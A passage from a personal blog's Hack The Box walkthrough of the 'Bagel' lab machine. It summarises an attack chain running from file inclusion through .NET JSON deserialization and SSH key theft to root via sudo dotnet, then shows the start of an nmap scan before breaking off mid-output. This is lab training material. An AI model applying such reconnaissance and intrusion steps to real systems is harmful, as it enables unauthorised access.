@@ -1,0 +1,879 @@
+<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-EQK3ZBE0XH"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EQK3ZBE0XH")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Bagel HTB Walkthrough - emdwyer</title><meta name=Description content="emdwyer's personal site - development, infosec, security"><meta property="og:title" content="Bagel HTB Walkthrough"><meta property="og:description" content="Introduction A fun machine that begins by exploiting a Python Flask app via Local File Inclusion, and using this to further enumerate the machine. From here, we take an unexpected change in direction to exploit a web socket running on .NET core. Using a JSON deserialization attack, we are able to take advantage of LFI once again to find a private SSH key and gain a foothold. We are able to access another account using previously discovered hard-coded database credentials."><meta property="og:type" content="article"><meta property="og:url" content="https://emdwyer.github.io/2023-06-03-bagel-htb/"><meta property="og:image" content="https://emdwyer.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-06-03T00:00:00+10:00"><meta property="article:modified_time" content="2023-06-03T15:53:45+10:00"><meta property="og:site_name" content="emdwyer"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://emdwyer.github.io/logo.png"><meta name=twitter:title content="Bagel HTB Walkthrough"><meta name=twitter:description content="Introduction A fun machine that begins by exploiting a Python Flask app via Local File Inclusion, and using this to further enumerate the machine. From here, we take an unexpected change in direction to exploit a web socket running on .NET core. Using a JSON deserialization attack, we are able to take advantage of LFI once again to find a private SSH key and gain a foothold. We are able to access another account using previously discovered hard-coded database credentials."><meta name=application-name content="emdwyer"><meta name=apple-mobile-web-app-title content="emdwyer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://emdwyer.github.io/2023-06-03-bagel-htb/><link rel=prev href=https://emdwyer.github.io/2023-05-13-interface-htb/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Bagel HTB Walkthrough","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/emdwyer.github.io\/2023-06-03-bagel-htb\/"},"image":["https:\/\/emdwyer.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"htb, security, penetration testing, .NET, JSON, deserialization, socket","wordcount":3173,"url":"https:\/\/emdwyer.github.io\/2023-06-03-bagel-htb\/","datePublished":"2023-06-03T00:00:00+10:00","dateModified":"2023-06-03T15:53:45+10:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"emdwyer","logo":"https:\/\/emdwyer.github.io\/avatar.jpg"},"author":{"@type":"Person","name":"emdwyer"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Bagel HTB Walkthrough</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>emdwyer</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-06-03>2023-06-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;3173 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;15 minutes&nbsp;<span id=/2023-06-03-bagel-htb/ class=leancloud_visitors data-flag-title="Bagel HTB Walkthrough">
+<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=./bagel.png data-srcset="./bagel.png, ./bagel.png 1.5x, ./bagel.png 2x" data-sizes=auto alt=./bagel.png title=Bagel></p><h2 id=introduction>Introduction</h2><p>A fun machine that begins by exploiting a Python Flask app via Local File Inclusion, and using this to further enumerate the machine. From here, we take an unexpected change in direction to exploit a web socket running on .NET core. Using a JSON deserialization attack, we are able to take advantage of LFI once again to find a private SSH key and gain a foothold. We are able to access another account using previously discovered hard-coded database credentials. From here, with access to run the dotnet binary as root, we are able to easily spawn an F# interactive shell and break out to a root shell.</p><h2 id=enumeration>Enumeration</h2><p>Let&rsquo;s run a port scan to find running services:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nmap</span> -sC -sV -o nmap/initial 10.10.11.201
+</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-04-07 18:45 AEST
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.201
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.24s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE  VERSION
+</span></span><span class=line><span class=cl>22/tcp   open  ssh      OpenSSH 8.8 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 6e4e1341f2fed9e0f7275bededcc68c2 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 80a7cd10e72fdb958b869b1b20652a98 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>5000/tcp open  upnp?
+</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>400</span> Bad Request
+</span></span><span class=line><span class=cl><span class=p>|</span>     Server: Microsoft-NetCore/2.0
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Fri, <span class=m>07</span> Apr <span class=m>2023</span> 08:46:07 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
+</span></span><span class=line><span class=cl><span class=p>|</span>   HTTPOptions: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>400</span> Bad Request
+</span></span><span class=line><span class=cl><span class=p>|</span>     Server: Microsoft-NetCore/2.0
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Fri, <span class=m>07</span> Apr <span class=m>2023</span> 08:46:24 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
+</span></span><span class=line><span class=cl><span class=p>|</span>   Help, SSLSessionReq: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>400</span> Bad Request
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html
+</span></span><span class=line><span class=cl><span class=p>|</span>     Server: Microsoft-NetCore/2.0
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Fri, <span class=m>07</span> Apr <span class=m>2023</span> 08:46:35 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>52</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
+</span></span><span class=line><span class=cl><span class=p>|</span>     Keep-Alive: <span class=nb>true</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;h1&gt;Bad Request <span class=o>(</span>Invalid request line <span class=o>(</span>parts<span class=o>)</span>.<span class=o>)</span>&lt;/h1&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>   RTSPRequest: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>400</span> Bad Request
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html
+</span></span><span class=line><span class=cl><span class=p>|</span>     Server: Microsoft-NetCore/2.0
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Fri, <span class=m>07</span> Apr <span class=m>2023</span> 08:46:08 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>54</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
+</span></span><span class=line><span class=cl><span class=p>|</span>     Keep-Alive: <span class=nb>true</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;h1&gt;Bad Request <span class=o>(</span>Invalid request line <span class=o>(</span>version<span class=o>)</span>.<span class=o>)</span>&lt;/h1&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>   TLSSessionReq, TerminalServerCookie: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>400</span> Bad Request
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html
+</span></span><span class=line><span class=cl><span class=p>|</span>     Server: Microsoft-NetCore/2.0
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Fri, <span class=m>07</span> Apr <span class=m>2023</span> 08:46:36 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>52</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
+</span></span><span class=line><span class=cl><span class=p>|</span>     Keep-Alive: <span class=nb>true</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_    &lt;h1&gt;Bad Request <span class=o>(</span>Invalid request line <span class=o>(</span>parts<span class=o>)</span>.<span class=o>)</span>&lt;/h1&gt;
+</span></span><span class=line><span class=cl>8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
+</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   FourOhFourRequest: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>404</span> NOT FOUND
+</span></span><span class=line><span class=cl><span class=p>|</span>     Server: Werkzeug/2.2.2 Python/3.10.9
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Fri, <span class=m>07</span> Apr <span class=m>2023</span> 08:46:08 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>207</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!doctype html&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;html <span class=nv>lang</span><span class=o>=</span>en&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;title&gt;404 Not Found&lt;/title&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;h1&gt;Not Found&lt;/h1&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>302</span> FOUND
+</span></span><span class=line><span class=cl><span class=p>|</span>     Server: Werkzeug/2.2.2 Python/3.10.9
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Fri, <span class=m>07</span> Apr <span class=m>2023</span> 08:46:03 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>263</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     Location: http://bagel.htb:8000/?page<span class=o>=</span>index.html
+</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!doctype html&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;html <span class=nv>lang</span><span class=o>=</span>en&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;title&gt;Redirecting...&lt;/title&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;h1&gt;Redirecting...&lt;/h1&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;http://bagel.htb:8000/?page=index.html&#34;</span>&gt;http://bagel.htb:8000/?page<span class=o>=</span>index.html&lt;/a&gt;. If not, click the link.
+</span></span><span class=line><span class=cl><span class=p>|</span>   Socks5: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!DOCTYPE HTML PUBLIC <span class=s2>&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=s2>&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;html&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;head&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;meta http-equiv<span class=o>=</span><span class=s2>&#34;Content-Type&#34;</span> <span class=nv>content</span><span class=o>=</span><span class=s2>&#34;text/html;charset=utf-8&#34;</span>&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;title&gt;Error response&lt;/title&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;/head&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;body&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;p&gt;Message: Bad request syntax <span class=o>(</span><span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>|     &#39;</span><span class=o>)</span>.&lt;/p&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;/body&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>_    &lt;/html&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://bagel.htb:8000/?page<span class=o>=</span>index.html
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Werkzeug/2.2.2 Python/3.10.9
+</span></span><span class=line><span class=cl><span class=m>2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class=line><span class=cl><span class=o>==============</span>NEXT SERVICE FINGERPRINT <span class=o>(</span>SUBMIT INDIVIDUALLY<span class=o>)==============</span>
+</span></span><span class=line><span class=cl>SF-Port5000-TCP:V<span class=o>=</span>7.93%I<span class=o>=</span>7%D<span class=o>=</span>4/7%Time<span class=o>=</span>642FD851%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>Get
+</span></span><span class=line><span class=cl>SF:Request,73,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Microsoft-
+</span></span></span><span class=line><span class=cl><span class=s2>SF:NetCore/2\.0\r\nDate:\x20Fri,\x2007\x20Apr\x202023\x2008:46:07\x20GMT\r
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\nConnection:\x20close\r\n\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>RTSPRequest,E8,<span class=s2>&#34;HTTP/1\.1\x20400\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-Ne
+</span></span></span><span class=line><span class=cl><span class=s2>SF:tCore/2\.0\r\nDate:\x20Fri,\x2007\x20Apr\x202023\x2008:46:08\x20GMT\r\n
+</span></span></span><span class=line><span class=cl><span class=s2>SF:Content-Length:\x2054\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:n\r\n&lt;h1&gt;Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(version\)\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:.\)&lt;/h1&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>HTTPOptions,73,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nServ
+</span></span></span><span class=line><span class=cl><span class=s2>SF:er:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Fri,\x2007\x20Apr\x202023\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:08:46:24\x20GMT\r\nConnection:\x20close\r\n\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>Help,E6,<span class=s2>&#34;HTTP/1\.1\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20Mi
+</span></span></span><span class=line><span class=cl><span class=s2>SF:crosoft-NetCore/2\.0\r\nDate:\x20Fri,\x2007\x20Apr\x202023\x2008:46:35\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20true\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(
+</span></span></span><span class=line><span class=cl><span class=s2>SF:parts\)\.\)&lt;/h1&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>SSLSessionReq,E6,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Reque
+</span></span></span><span class=line><span class=cl><span class=s2>SF:st\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\r
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\nDate:\x20Fri,\x2007\x20Apr\x202023\x2008:46:35\x20GMT\r\nContent-Leng
+</span></span></span><span class=line><span class=cl><span class=s2>SF:th:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n&lt;h1&gt;Bad
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20Request\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)&lt;/h1&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>T
+</span></span><span class=line><span class=cl>SF:erminalServerCookie,E6,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ype:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Fri,
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x2007\x20Apr\x202023\x2008:46:36\x20GMT\r\nContent-Length:\x2052\r\nCo
+</span></span></span><span class=line><span class=cl><span class=s2>SF:nnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n&lt;h1&gt;Bad\x20Request\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\(Invalid\x20request\x20line\x20\(parts\)\.\)&lt;/h1&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>TLSSessionReq,E6
+</span></span><span class=line><span class=cl>SF:,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nS
+</span></span></span><span class=line><span class=cl><span class=s2>SF:erver:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Fri,\x2007\x20Apr\x202023\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x2008:46:36\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\n
+</span></span></span><span class=line><span class=cl><span class=s2>SF:Keep-Alive:\x20true\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(Invalid\x20request\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20line\x20\(parts\)\.\)&lt;/h1&gt;&#34;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=o>==============</span>NEXT SERVICE FINGERPRINT <span class=o>(</span>SUBMIT INDIVIDUALLY<span class=o>)==============</span>
+</span></span><span class=line><span class=cl>SF-Port8000-TCP:V<span class=o>=</span>7.93%I<span class=o>=</span>7%D<span class=o>=</span>4/7%Time<span class=o>=</span>642FD84C%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>Get
+</span></span><span class=line><span class=cl>SF:Request,1EA,<span class=s2>&#34;HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.2\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20Python/3\.10\.9\r\nDate:\x20Fri,\x2007\x20Apr\x202023\x2008:46:03\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
